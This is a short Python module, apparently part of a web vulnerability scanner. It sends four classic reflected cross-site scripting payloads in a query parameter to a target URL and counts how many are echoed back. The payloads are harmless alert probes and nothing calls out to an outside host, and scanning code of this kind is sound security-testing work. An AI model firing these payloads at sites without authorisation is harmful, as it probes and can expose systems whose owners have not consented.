import requests

def run(target):
    payloads = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        "<script>confirm(1)</script>"
    ]

    reflections = 0
    hits = 0
    sent = 0

    for payload in payloads:
        try:
            url = f"{target}?q={payload}"
            r = requests.get(url, timeout=6)
            sent += 1
            if payload in r.text:
                reflections += 1
            if "alert" in r.text:
                hits += 1
        except:
            continue

    return {
        "module": "fuzz_xss",
        "payloads_sent": sent,
        "reflections": reflections,
        "hits": hits,
        "notes": "Basic reflected XSS test"
    }
